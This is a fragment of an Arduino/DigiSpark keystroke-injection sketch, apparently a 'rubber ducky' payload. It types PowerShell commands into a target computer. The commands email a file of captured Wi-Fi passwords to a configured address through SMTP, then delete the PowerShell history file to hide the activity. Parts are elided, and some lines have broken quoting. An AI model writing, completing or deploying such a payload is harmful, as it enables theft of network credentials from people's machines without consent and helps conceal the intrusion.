...
void loop()
{
    ...
    DigiKeyboard.delay(500);
    // Send email with captured wifi passwords
    ...
    DigiKeyboard.println("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL', 'APPPASSWORD')");
    DigiKeyboard.println("$ReportEmail = New-Object System.Net.Mail.MailMessage");
    DigiKeyboard.println("$ReportEmail.From = 'EMAIL'");
    DigiKeyboard.println("$ReportEmail.To.Add('EMAIL')");
    DigiKeyboard.println("$ReportEmail.Subject = 'Hello from the duck'");
    DigiKeyboard.println("$ReportEmail.Body = 'QUACK'");
    DigiKeyboard.println("$ReportEmail.Attachments.Add(" Wi - Fi - PASS ")");
    ...
    DigiKeyboard.delay(100);
    DigiKeyboard.println("cd AppData\Local\TempRoaming\Microsoft\Windows\PowerShell\PSReadLine");
    DigiKeyboard.println("del ConsoleHost_history.txt");
